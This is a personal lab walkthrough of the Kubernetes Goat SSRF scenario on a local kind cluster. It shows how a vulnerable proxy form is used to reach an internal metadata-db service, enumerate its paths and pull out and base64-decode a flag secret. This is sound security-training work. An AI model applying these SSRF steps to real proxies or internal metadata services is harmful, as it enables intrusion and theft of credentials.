# Kubernetes Goat — SSRF Walkthrough
**Scenario:** SSRF in the Kubernetes World  
**Cluster:** kind (local, no cloud required)  
**Goal:** Exfiltrate an internal secret via a vulnerable proxy service

---

## Prerequisites

Docker Desktop must be running on Windows with WSL2 integration enabled.  
Confirm in Docker Desktop → Settings → Resources → WSL Integration → your Ubuntu distro is toggled on.

Open VS Code and start a **WSL2 terminal** (not Git Bash — the prompt should show `xsnaerx@SnowLap:~$`).

Verify tools are installed:

```bash
docker ps
kind --version
kubectl version --client
```

---

## Step 1 — Create the kind Cluster

```bash
kind create cluster --name kubernetes-goat
kubectl cluster-info --context kind-kubernetes-goat
```

The cluster runs entirely inside Docker containers on your local machine. No AWS, no cloud, no cost.

---

## Step 2 — Clone and Deploy Kubernetes Goat

```bash
cd ~/OneDrive/Documents/k8s-security-portfolio
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
```

The manifests are hardcoded to the `default` namespace. Leave them as-is and deploy:

```bash
bash setup-kubernetes-goat.sh
```

Wait 2–3 minutes, then confirm pods are running:

```bash
kubectl get pods -n default
```

You should see `internal-proxy-deployment`, `metadata-db`, `build-code-deployment`, and others in `Running` state.

---

## Step 3 — Start Port Forwards

The SSRF scenario has two components that both need to be forwarded. Open **two separate terminals** and run one command in each:

**Terminal 1 — Frontend UI:**
```bash
cd ~/OneDrive/Documents/k8s-security-portfolio/kubernetes-goat
kubectl port-forward svc/internal-proxy-info-app-service 1232:5000 -n default
```

**Terminal 2 — Backend API:**
```bash
cd ~/OneDrive/Documents/k8s-security-portfolio/kubernetes-goat
kubectl port-forward svc/internal-proxy-api-service 3000:3000 -n default
```

Both terminals should show:
```
Forwarding from 127.0.0.1:XXXX -> XXXX
```

Leave both running. Use a third terminal for any other commands.

> **Note:** If either port forward drops mid-session, just re-run the command in that terminal. If the browser stops loading, kill and restart both port forwards.

---

## Step 4 — Verify the App is Running

In a third terminal, confirm the service responds:

```bash
curl http://127.0.0.1:1232
```

Expected output:
```json
{"info": "Refer to internal http://metadata-db for more information"}
```

This response is already leaking information — it reveals that an internal service called `metadata-db` exists inside the cluster.

Open your Windows browser and navigate to `http://127.0.0.1:1232`. You should see a UI with three fields: **Endpoint**, **Method**, and **Custom Header**.

---

## Step 5 — The SSRF Exploit

### Recon — confirm the vulnerability

Fill in the form:
- **Endpoint:** `http://metadata-db/`
- **Method:** `GET`
- **Custom Header:** *(leave blank)*

Click Submit. Expected response:
```html
<pre>
<a href="1.0">1.0</a>
<a href="latest/">latest/</a>
</pre>
```

The proxy fetched `metadata-db` on your behalf. Your browser never contacted that service directly — it has no external exposure. This confirms the SSRF vulnerability.

---

### Enumeration — traverse the directory

- **Endpoint:** `http://metadata-db/latest/`
- **Method:** `GET`

Expected response:
```
latest/profile/secrets
```

---

### Exfiltration — extract the secret

- **Endpoint:** `http://metadata-db/latest/secrets/kubernetes-goat`
- **Method:** `GET`

Expected response:
```json
{"metadata": "static-metadata", "data": "azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI="}
```

---

## Step 6 — Decode the Exfiltrated Secret

In your terminal:

```bash
echo "azhzLWdvYXQtY2E5MGVmODVkYjdhNWFlZjAxOThkMDJmYjBkZjljYWI=" | base64 -d
```

Output:
```
k8s-goat-ca90ef85db7a5aef0198d02fb0df9cab
```

---

## What Was Demonstrated

| Step | Action | Significance |
|------|--------|--------------|
| Info leak | App response revealed `metadata-db` | Recon via exposed internal hostname |
| SSRF confirmed | Proxy fetched internal service on your behalf | Bypassed network boundary |
| Enumeration | Traversed `/latest/` directory | Attacker-controlled path traversal |
| Exfiltration | Retrieved `/latest/secrets/kubernetes-goat` | Accessed secrets with no direct network path |
| Decode | Base64 decoded the credential | Fully usable secret exfiltrated |

**Key point:** `metadata-db` is a ClusterIP service — it has no external IP and is unreachable from outside the cluster. The SSRF vulnerability in the proxy service was the only path in.

---

## Teardown

When finished, delete the cluster to free resources:

```bash
kind delete cluster --name kubernetes-goat
```

To rebuild next time, start from Step 1. The `kubernetes-goat` repo will still be cloned so you can skip Step 2's `git clone` and go straight to `bash setup-kubernetes-goat.sh`.
